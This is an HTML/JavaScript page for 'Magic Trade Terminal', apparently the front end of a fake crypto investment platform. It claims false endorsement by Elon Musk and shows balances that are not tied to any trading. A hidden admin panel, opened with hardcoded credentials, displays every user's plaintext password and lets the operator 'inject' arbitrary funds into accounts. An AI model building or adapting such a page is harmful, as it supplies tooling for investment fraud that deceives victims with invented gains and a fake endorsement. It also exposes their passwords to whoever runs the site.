<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Trade Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <style>
        body { background: #010409; color: #e6edf3; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; margin: 0; }
        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; transition: 0.2s; }
        .nav-item:active { color: #58a6ff; transform: scale(0.9); }
        #scroll-area { flex: 1; overflow-y: auto; padding-bottom: 120px; scroll-behavior: smooth; }
        .chart-box { height: 350px; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #30363d; background: #000; margin-bottom: 20px; }
        .admin-glow { border: 1px solid #238636 !important; box-shadow: 0 0 15px rgba(35, 134, 54, 0.2); }
    </style>
</head>
<body>

    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6">
        <h1 class="text-4xl font-black text-white italic tracking-tighter mb-2">MAGIC<span class="text-blue-500">TRADE</span></h1>
        <p class="text-[9px] text-slate-500 uppercase mb-8 tracking-widest">Global Secure Terminal <span onclick="triggerAdminLogin()" class="cursor-help">‚óè</span></p>
        
        <div class="magic-card p-6 w-full max-w-sm space-y-4 shadow-2xl">
            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none focus:border-blue-500 transition-all">
            <input type="tel" id="reg-phone" placeholder="Phone Number" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none focus:border-blue-500 transition-all">
            <input type="email" id="email" placeholder="Email Address" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none focus:border-blue-500 transition-all">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none focus:border-blue-500 transition-all">
            <button onclick="handleAuth()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs tracking-widest text-white shadow-lg active:scale-95 transition-all">Enter Node</button>
            <button onclick="toggleAuthMode()" id="auth-toggle-btn" class="text-xs text-blue-500 font-bold block mx-auto mt-4 uppercase tracking-tighter">Request Access / Create Node</button>
        </div>
    </div>

    <div id="app" class="hidden flex flex-col h-full overflow-hidden">
        <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
            <div class="flex flex-col">
                <span id="user-display" class="font-bold text-[11px] text-white uppercase italic tracking-tighter">---</span>
                <span class="text-[7px] text-slate-500 uppercase font-mono" id="node-id-display">Node: Connecting...</span>
            </div>
            <span class="text-[8px] text-blue-500 font-bold uppercase border border-blue-500/30 px-2 py-1 rounded">‚óè Musk Verified Node</span>
        </header>

        <div id="scroll-area">
            <main class="p-4">
                
                <section id="home-sec" class="space-y-4">
                    <div class="magic-card p-6 bg-gradient-to-br from-[#1b2129] to-[#010409] relative overflow-hidden">
                        <div class="relative z-10">
                            <p class="text-slate-500 text-[9px] font-bold uppercase tracking-widest">Trading Capital</p>
                            <h2 class="text-4xl font-mono font-bold text-white tracking-tighter" id="display-bal">$0.00</h2>
                            <p class="text-blue-400 font-mono text-[10px] mt-1" id="display-btc">0.000000 BTC</p>
                        </div>
                        <div class="absolute right-[-20px] top-[-20px] opacity-10 pointer-events-none">
                            <h1 class="text-8xl font-black italic">MAGIC</h1>
                        </div>
                    </div>
                    <div id="master-market-feed"></div>
                </section>

                <section id="admin-sec" class="hidden space-y-6">
                    <div class="flex justify-between items-center">
                        <h3 class="text-2xl font-black text-blue-500 italic uppercase">Admin Dashboard</h3>
                        <span id="admin-user-count" class="bg-blue-600 text-white text-[10px] font-black px-2 py-1 rounded">Nodes: 0</span>
                    </div>

                    <div id="user-logs" class="space-y-4">
                        </div>
                </section>

                <section id="profile-sec" class="hidden space-y-4">
                    <div class="magic-card p-8 text-center space-y-4">
                        <div class="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mx-auto border border-blue-500/50">
                            <span class="text-2xl">üë§</span>
                        </div>
                        <div>
                            <p id="prof-name" class="text-2xl font-black uppercase tracking-tighter text-white">---</p>
                            <p id="prof-email" class="text-slate-500 text-xs font-mono">---</p>
                        </div>
                        <div class="pt-4 border-t border-slate-800">
                            <p class="text-blue-500 text-[10px] font-bold uppercase tracking-widest">üöÄ Official Sponsor</p>
                            <p class="text-white text-xs font-black italic">ELON MUSK / X-SYSTEMS</p>
                        </div>
                    </div>
                </section>

            </main>
        </div>

        <nav class="bottom-nav">
            <div onclick="showSection('home')" class="nav-item">üìà<span class="mt-1 font-bold">Markets</span></div>
            <div onclick="showSection('profile')" class="nav-item">üë§<span class="mt-1 font-bold">Profile</span></div>
            <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden text-green-500">üõ°Ô∏è<span class="mt-1 font-bold">Admin</span></div>
            <div onclick="logoutUser()" class="nav-item text-red-500 font-bold">üö´<span class="mt-1 font-bold">Logout</span></div>
        </nav>
    </div>

    <script>
        let users = JSON.parse(localStorage.getItem('magic_users')) || {};
        let activeSession = localStorage.getItem('magic_session') || null;

        window.onload = () => { 
            if(activeSession) enterApp(activeSession); 
            renderMarketFeed(); 
        };

        // Handles Registration and Fast Login
        function handleAuth() {
            const e = document.getElementById('email').value.trim().toLowerCase();
            const p = document.getElementById('pass').value;
            
            // If Registration fields are visible
            if(!document.getElementById('reg-name').classList.contains('hidden')) {
                const n = document.getElementById('reg-name').value;
                const ph = document.getElementById('reg-phone').value;
                if(!n || !e || !p) return alert("All nodes require data.");
                
                users[e] = { name: n, phone: ph, pass: p, bal: 0, isPending: false, isBlocked: false };
                save(); 
                alert("Node Established. Proceeding to Login.");
                toggleAuthMode();
                return;
            }

            // Standard Login Logic
            if(users[e] && users[e].pass === p) {
                if(users[e].isBlocked) return alert("Node Terminated by Admin.");
                enterApp(e);
            } else {
                alert("Credential Mismatch.");
            }
        }

        function enterApp(e) {
            activeSession = e; 
            localStorage.setItem('magic_session', e);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            
            // Check for Admin Rights
            if(localStorage.getItem('magic_is_admin') === 'true') {
                document.getElementById('admin-nav-btn').classList.remove('hidden');
            }
            updateUI();
        }

        function updateUI() {
            const u = users[activeSession]; if(!u) return;
            document.getElementById('display-bal').innerText = "$" + u.bal.toLocaleString();
            document.getElementById('display-btc').innerText = (u.bal / 96000).toFixed(6) + " BTC";
            document.getElementById('prof-name').innerText = u.name;
            document.getElementById('prof-email').innerText = activeSession;
            document.getElementById('user-display').innerText = u.name;
            document.getElementById('node-id-display').innerText = "Node: " + activeSession.substring(0, 8);
        }

        // --- ADMIN FACE LOGIC (OVERSIGHT & INJECTION) ---
        function loadUserLogs() {
            const currentData = JSON.parse(localStorage.getItem('magic_users')) || {};
            const logContainer = document.getElementById('user-logs');
            const userEntries = Object.entries(currentData);
            
            document.getElementById('admin-user-count').innerText = "Nodes: " + userEntries.length;

            logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
                <div class="magic-card p-4 border-l-4 ${data.bal === 0 ? 'border-l-blue-500' : 'border-l-green-500'}">
                    <div class="flex justify-between items-start mb-2">
                        <div>
                            <p class="text-blue-400 font-black text-xs uppercase">${data.name}</p>
                            <p class="text-white text-[10px] font-mono select-all">${email}</p>
                            <p class="text-[8px] text-red-500 font-bold mt-1">PASSWORD: ${data.pass}</p>
                        </div>
                        <div class="text-right">
                            <p class="text-white font-bold text-xs">$${(data.bal || 0).toLocaleString()}</p>
                            <p class="text-[7px] text-slate-500 uppercase">Balance</p>
                        </div>
                    </div>
                    <button onclick="injectDemoFunds('${email}')" class="w-full mt-2 bg-blue-600 text-white text-[9px] font-black py-2 rounded-lg uppercase shadow-lg">Inject Funds üí∏</button>
                    <button onclick="directBan('${email}')" class="w-full mt-1 text-[7px] text-slate-600 uppercase font-bold">${data.isBlocked ? 'Unban User' : 'Ban User'}</button>
                </div>
            `).join('');
        }

        function injectDemoFunds(email) {
            const amount = prompt("Inject USDT for " + email + ":", "1000");
            if(amount) {
                users[email].bal += parseFloat(amount);
                save(); 
                loadUserLogs(); 
                updateUI();
                alert("Node " + email + " updated with $" + amount);
            }
        }

        function directBan(email) {
            users[email].isBlocked = !users[email].isBlocked;
            save(); loadUserLogs();
        }

        // --- GLOBAL UTILITIES ---
        function logoutUser() {
            if(confirm("Sign Out?")) {
                localStorage.removeItem('magic_session');
                localStorage.removeItem('magic_is_admin');
                location.reload();
            }
        }

        function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }

        function showSection(s) { 
            ['home', 'profile', 'admin'].forEach(x => {
                const el = document.getElementById(x + '-sec');
                if(el) el.classList.add('hidden');
            });
            document.getElementById(s + '-sec').classList.remove('hidden'); 
            if(s === 'admin') loadUserLogs();
        }

        function toggleAuthMode() { 
            const isReg = document.getElementById('reg-name').classList.toggle('hidden');
            document.getElementById('reg-phone').classList.toggle('hidden');
            document.getElementById('auth-toggle-btn').innerText = isReg ? "Login to Node" : "Request Access / Create Node";
        }

        function triggerAdminLogin() { 
            if(prompt("ADMIN_ID")==="MASTER_ADA" && prompt("ADMIN_KEY")==="ADA_777_NODE") { 
                localStorage.setItem('magic_is_admin', true); 
                enterApp(activeSession || "MASTER_ADMIN"); 
            } 
        }

        function renderMarketFeed() {
            const assets = ["BTCUSD", "ETHUSD", "SOLUSD", "XAUUSD"];
            document.getElementById('master-market-feed').innerHTML = assets.map((a, i) => `
                <div class="mb-4">
                    <p class="text-[9px] font-bold text-slate-500 uppercase ml-1 mb-2">Live Market Node: ${a}</p>
                    <div class="chart-box" id="chart_${i}"></div>
                </div>
            `).join('');
            assets.forEach((a, i) => {
                new TradingView.widget({ "autosize": true, "symbol": a, "interval": "1", "theme": "dark", "container_id": `chart_${i}`, "hide_top_toolbar": true });
            });
        }
    </script>
</body>
</html>
